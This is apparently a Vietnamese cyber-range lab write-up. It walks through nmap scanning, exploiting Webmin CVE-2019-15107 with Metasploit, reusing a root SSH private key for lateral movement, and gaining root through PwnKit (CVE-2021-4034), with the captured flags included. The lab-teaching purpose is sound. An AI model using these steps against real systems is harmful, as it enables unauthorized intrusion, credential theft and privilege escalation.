+++
title = 'CyberRange-Billy the Kid'
date = 2026-02-15T17:36:13+07:00
draft = false
+++

## I. TỔNG QUAN HỆ THỐNG

Sơ đồ tấn công bao gồm máy tấn công `Kali` và các máy chủ mục tiêu trong mạng:

<img width="975" height="486" alt="image" src="https://github.com/user-attachments/assets/8d651e54-7299-40b5-9b7f-d0dd6387d26e" />

## II. GIAI ĐOẠN 1: KHAI THÁC MÁY WEBSERVER

Địa chỉ IP: `192.168.125.10`

### 1. Thu thập thông tin (Information Gathering)

Bước đầu tiên, tiến hành quét các cổng dịch vụ đang mở trên máy mục tiêu bằng công cụ `nmap` để xác định bề mặt tấn công.

- Công cụ sử dụng: `nmap`
- Câu lệnh: `nmap -sC -sV 192.168.125.10`
- Kết quả quét:
  - Port `22`: Dịch vụ `SSH` (OpenSSH 7.6p1).
  - Port `10000`: Dịch vụ `Webmin` (MiniServ 1.910).

<img width="887" height="339" alt="image" src="https://github.com/user-attachments/assets/94c8903c-32d3-4158-acf9-e29ad17482a8" />
 
### 2. Phân tích và khai thác lỗ hổng (Vulnerability Analysis & Exploitation)

Dựa trên phiên bản `Webmin 1.910` đang chạy trên cổng `10000`, tiến hành tra cứu cơ sở dữ liệu lỗ hổng.

- Phát hiện: Phiên bản này tồn tại lỗ hổng thực thi mã từ xa (Remote Code Execution - RCE).
  
- Mã lỗi: `CVE-2019-15107`.

**Quá trình khai thác bằng Metasploit Framework:**

#### 1.	Khởi động Metasploit và tìm kiếm module khai thác

- `search 15107`

<img width="879" height="188" alt="image" src="https://github.com/user-attachments/assets/897636be-0af3-4efd-9893-9ef73c4cc6c5" />

#### 2.	Lựa chọn module

- `use 0` (exploit/linux/http/webmin_backdoor)

<img width="569" height="80" alt="image" src="https://github.com/user-attachments/assets/2697c0bc-c350-4f98-b5bf-c0456f6077bf" />

#### 3.	Cấu hình các tham số tấn công

- `set RHOSTS 192.168.125.10` (IP Mục tiêu)
- `set LHOST 192.168.125.20` (IP Máy tấn công)
- `set SSL true` (Bắt buộc vì Webmin chạy trên https)

<img width="906" height="415" alt="image" src="https://github.com/user-attachments/assets/81db1fe6-952d-4c33-961a-61f5fd0f511c" />

#### 4.	Thực thi tấn công

- `run`

<img width="911" height="187" alt="image" src="https://github.com/user-attachments/assets/7206cc59-e557-4090-80de-be6fdd231709" />

### 3. Kết quả

Sau khi chiếm được quyền điều khiển, tiến hành đọc nội dung file `flag.txt`.
- Câu lệnh: `cat /root/flag.txt`
- Flag: `flag{p4tch_your_w3bm1n}`

<img width="975" height="621" alt="image" src="https://github.com/user-attachments/assets/3a220acb-c24c-433f-8ec6-d230f774df13" />

## III. GIAI ĐOẠN 2: DI CHUYỂN NGANG

Trong quá trình hậu khai thác, kiểm tra hệ thống file trên máy WebServer, phát hiện dấu hiệu của một máy chủ khác trong mạng.

### 1. Phát hiện dữ liệu nhạy cảm

Kiểm tra thư mục SSH của tài khoản root.
- Kiểm tra thư mục SSH của root: `ls -la /root/.ssh`

- Phát hiện: Tệp tin `192.168.125.12_billy` chứa khóa bí mật RSA (Private Key).

- Phân tích: Đây có thể là khóa đăng nhập SSH dành cho người dùng `billy` trên máy chủ có IP `192.168.125.12`.

<img width="792" height="925" alt="image" src="https://github.com/user-attachments/assets/8690448b-dc6d-4366-9a9f-1e3593d386c0" />
 
### 2. Truy cập máy Linux

Sử dụng khóa RSA vừa tìm được để SSH vào máy mục tiêu tiếp theo.

- Lệnh thực hiện: `ssh -i id_rsa billy@192.168.125.12`
- Kết quả: Đăng nhập thành công với quyền user `billy`.

<img width="642" height="153" alt="image" src="https://github.com/user-attachments/assets/c5851f2b-c088-431a-9a7f-dca5325855e7" />

## IV. GIAI ĐOẠN 3: LEO THANG ĐẶC QUYỀN MÁY LINUX

Địa chỉ IP: `192.168.125.12`

### 1. Kiểm tra hệ thống (Enumeration)

Sau khi truy cập được vào máy với quyền user `billy`, tiến hành kiểm tra phiên bản hệ điều hành và các ứng dụng được cài đặt để tìm đường leo quyền.

- Kiểm tra phiên bản OS: `cat /etc/os-release`
- Kiểm tra pkexec:
  - Lệnh: `pkexec --version`
    - Kết quả: `pkexec version 0.112`
  - Kiểm tra quyền SUID: `ls -la /usr/bin/pkexec`
    - Kết quả: `-rwsr-xr-x` => Có quyền SUID.

<img width="720" height="602" alt="image" src="https://github.com/user-attachments/assets/e83b66b4-c6eb-44ff-a9e6-a6218b960af9" />

### 2. Xác định lỗ hổng (Vulnerability Identification)

Phiên bản pkexec hiện tại dính lỗ hổng nghiêm trọng PwnKit.

- Mã lỗi: `CVE-2021-4034`.
- Mô tả: Lỗ hổng cho phép user thường leo lên quyền root thông qua việc thao tác biến môi trường trong pkexec.

### 3. Thực thi mã khai thác (Exploitation)

Sử dụng PoC viết bằng ngôn ngữ C để tiến hành leo quyền.

#### Bước 1: Tạo file `exploit.c` trên máy mục tiêu

<img width="975" height="571" alt="image" src="https://github.com/user-attachments/assets/2a57e2c9-6404-4a4f-9f1d-8cf365bb1fac" />

#### Bước 2: Biên dịch và thực thi

- Biên dịch mã nguồn: `gcc exploit.c -o exploit`
- Chạy file thực thi: `./exploit`

### 4. Kết quả

Sau khi chạy file `exploit`, tiến hành kiểm tra lại quyền hạn hiện tại.

- Lệnh kiểm tra: `whoami`
  - Kết quả: `root`
  
=> Hệ thống đã bị chiếm quyền điều khiển cao nhất.

<img width="472" height="130" alt="image" src="https://github.com/user-attachments/assets/bf2aa500-dfd3-4d80-9ca7-6bcf2b4b80d4" />

Sau khi chiếm được quyền điều khiển, tiến hành đọc nội dung file `flag.txt`.

- Câu lệnh: `cat /root/flag.txt`
- Flag: `flag{m4ilut1ls_suid?}`

<img width="940" height="215" alt="image" src="https://github.com/user-attachments/assets/ab2af23e-c8f9-48da-8c7b-61b4e35dee61" />